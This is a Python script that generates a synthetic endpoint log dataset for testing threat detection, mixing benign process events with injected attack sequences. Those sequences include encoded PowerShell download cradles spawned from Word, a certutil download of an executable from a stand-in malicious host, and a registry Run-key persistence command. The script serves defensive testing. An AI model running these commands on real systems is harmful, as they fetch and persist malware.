from __future__ import annotations

import csv
import random
from collections import defaultdict
from datetime import datetime, timedelta
from pathlib import Path


OUTPUT_PATH = Path("data/realistic_test_logs_1200.csv")
TOTAL_ROWS = 1200
SEED = 42


HOSTS = [
    "eng-ws-01",
    "eng-ws-02",
    "fin-ws-01",
    "fin-ws-02",
    "hr-ws-01",
    "ops-ws-01",
    "ops-ws-02",
    "sales-lt-01",
    "sales-lt-02",
    "shared-jump-01",
]

USERS = [
    "alice",
    "bob",
    "charlie",
    "diana",
    "ethan",
    "farah",
    "george",
    "helen",
    "irfan",
    "julia",
]

INTERNAL_IPS = [
    "10.0.0.5",
    "10.0.0.10",
    "10.0.1.15",
    "10.0.2.20",
    "10.1.5.12",
    "172.16.4.25",
    "172.16.10.8",
    "192.168.1.12",
    "192.168.10.9",
]

EXTERNAL_IPS = [
    "8.8.8.8",
    "1.1.1.1",
    "23.45.67.89",
    "45.33.32.156",
    "52.95.110.1",
    "104.18.20.12",
    "142.250.183.14",
    "151.101.1.69",
    "185.199.108.153",
]

BROWSERS = ["chrome.exe", "msedge.exe", "firefox.exe"]
OFFICE_APPS = ["winword.exe", "excel.exe", "outlook.exe"]
ADMIN_TOOLS = ["cmd.exe", "powershell.exe", "reg.exe", "certutil.exe"]
COMMON_PROCESSES = [
    "explorer.exe",
    "teams.exe",
    "slack.exe",
    "zoom.exe",
    "notepad.exe",
    "onenote.exe",
    "code.exe",
]

USER_AGENTS = {
    "browser": ["chrome", "edge", "firefox"],
    "system": ["none", "system", "windows-update"],
    "suspicious": ["python-requests", "curl/7.68", "winhttp"],
}


def choose_user_agent(process: str, suspicious: bool = False) -> str:
    if suspicious:
        return random.choice(USER_AGENTS["suspicious"])
    if process in BROWSERS:
        return random.choice(USER_AGENTS["browser"])
    return random.choice(USER_AGENTS["system"])


def build_normal_command(process: str, user: str) -> tuple[str, str, int, str]:
    if process in BROWSERS:
        return (
            f"{process} --profile-directory=Default --new-window https://portal.company.internal",
            random.choice(EXTERNAL_IPS),
            443,
            choose_user_agent(process),
        )
    if process == "teams.exe":
        return (
            "teams.exe --type=renderer",
            random.choice(EXTERNAL_IPS),
            443,
            "teams-client",
        )
    if process == "slack.exe":
        return (
            "slack.exe --processStart slack.exe",
            random.choice(EXTERNAL_IPS),
            443,
            "slack-client",
        )
    if process == "zoom.exe":
        return (
            "zoom.exe --url=zoommtg://companymeeting",
            random.choice(EXTERNAL_IPS),
            443,
            "zoom-client",
        )
    if process == "outlook.exe":
        return (
            f'outlook.exe /recycle "{user}@company.com"',
            random.choice(EXTERNAL_IPS),
            443,
            "outlook",
        )
    if process == "code.exe":
        return (
            f'code.exe "C:\\Users\\{user}\\Documents\\project"',
            random.choice(INTERNAL_IPS),
            445,
            "none",
        )
    if process == "notepad.exe":
        return (
            f'notepad.exe "C:\\Users\\{user}\\Documents\\notes.txt"',
            random.choice(INTERNAL_IPS),
            0,
            "none",
        )
    return (
        f"{process} /background",
        random.choice(INTERNAL_IPS),
        0,
        "none",
    )


def generate_benign_event(timestamp: datetime) -> dict:
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    process = random.choice(BROWSERS + OFFICE_APPS + COMMON_PROCESSES)
    parent_process = "explorer.exe"
    if process in {"teams.exe", "slack.exe", "zoom.exe"}:
        parent_process = "explorer.exe"
    elif process in OFFICE_APPS:
        parent_process = "explorer.exe"

    command_line, ip, destination_port, user_agent = build_normal_command(process, user)
    return {
        "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
        "host": host,
        "user": user,
        "process": process,
        "parent_process": parent_process,
        "command_line": command_line,
        "ip": ip,
        "destination_port": destination_port,
        "user_agent": user_agent,
    }


def generate_suspicious_sequence(start_time: datetime, host: str, user: str, variant: str) -> list[dict]:
    if variant == "macro_powershell":
        return [
            {
                "timestamp": (start_time + timedelta(minutes=0)).strftime("%Y-%m-%d %H:%M:%S"),
                "host": host,
                "user": user,
                "process": "powershell.exe",
                "parent_process": "winword.exe",
                "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                "ip": "8.8.8.8",
                "destination_port": 443,
                "user_agent": random.choice(USER_AGENTS["suspicious"]),
            },
            {
                "timestamp": (start_time + timedelta(minutes=1)).strftime("%Y-%m-%d %H:%M:%S"),
                "host": host,
                "user": user,
                "process": "powershell.exe",
                "parent_process": "winword.exe",
                "command_line": "powershell -enc aW52b2tlLXd..."
                ,
                "ip": "1.1.1.1",
                "destination_port": 443,
                "user_agent": random.choice(USER_AGENTS["suspicious"]),
            },
            {
                "timestamp": (start_time + timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S"),
                "host": host,
                "user": user,
                "process": "powershell.exe",
                "parent_process": "winword.exe",
                "command_line": "powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==",
                "ip": "45.33.32.156",
                "destination_port": 80,
                "user_agent": random.choice(USER_AGENTS["suspicious"]),
            },
        ]

    if variant == "certutil_dropper":
        return [
            {
                "timestamp": (start_time + timedelta(minutes=0)).strftime("%Y-%m-%d %H:%M:%S"),
                "host": host,
                "user": user,
                "process": "certutil.exe",
                "parent_process": "cmd.exe",
                "command_line": "certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe",
                "ip": "23.45.67.89",
                "destination_port": 80,
                "user_agent": "curl/7.68",
            },
            {
                "timestamp": (start_time + timedelta(minutes=1)).strftime("%Y-%m-%d %H:%M:%S"),
                "host": host,
                "user": user,
                "process": "evil.exe",
                "parent_process": "explorer.exe",
                "command_line": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\evil.exe",
                "ip": random.choice(INTERNAL_IPS),
                "destination_port": 0,
                "user_agent": "none",
            },
            {
                "timestamp": (start_time + timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S"),
                "host": host,
                "user": user,
                "process": "reg.exe",
                "parent_process": "cmd.exe",
                "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d evil.exe",
                "ip": random.choice(INTERNAL_IPS),
                "destination_port": 0,
                "user_agent": "none",
            },
        ]

    return [
        {
            "timestamp": (start_time + timedelta(minutes=0)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "notepad.exe",
            "parent_process": "explorer.exe",
            "command_line": "notepad.exe",
            "ip": "45.33.32.156",
            "destination_port": 4444,
            "user_agent": "winhttp",
        },
        {
            "timestamp": (start_time + timedelta(minutes=1)).strftime("%Y-%m-%d %H:%M:%S"),
            "host": host,
            "user": user,
            "process": "notepad.exe",
            "parent_process": "explorer.exe",
            "command_line": "notepad.exe",
            "ip": "104.18.20.12",
            "destination_port": 443,
            "user_agent": "python-requests",
        },
    ]


def main():
    random.seed(SEED)
    OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)

    start = datetime(2026, 4, 1, 8, 0, 0)
    rows: list[dict] = []

    # Base benign activity across the day.
    for index in range(1020):
        timestamp = start + timedelta(minutes=index)
        rows.append(generate_benign_event(timestamp))

    # Inject recurring suspicious patterns across different hosts/users.
    suspicious_variants = [
        "macro_powershell",
        "certutil_dropper",
        "injected_notepad",
    ]
    suspicious_counts = defaultdict(int)
    sequence_start = start + timedelta(minutes=45)
    while len(rows) < TOTAL_ROWS:
        variant = random.choice(suspicious_variants)
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        rows.extend(generate_suspicious_sequence(sequence_start, host, user, variant))
        suspicious_counts[variant] += 1
        sequence_start += timedelta(minutes=random.randint(25, 60))

    rows = rows[:TOTAL_ROWS]
    rows.sort(key=lambda row: row["timestamp"])

    fieldnames = [
        "timestamp",
        "host",
        "user",
        "process",
        "parent_process",
        "command_line",
        "ip",
        "destination_port",
        "user_agent",
    ]

    with open(OUTPUT_PATH, "w", newline="", encoding="utf-8") as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    print(f"Wrote {len(rows)} rows to {OUTPUT_PATH}")
    print(f"Injected suspicious sequences: {dict(suspicious_counts)}")


if __name__ == "__main__":
    main()
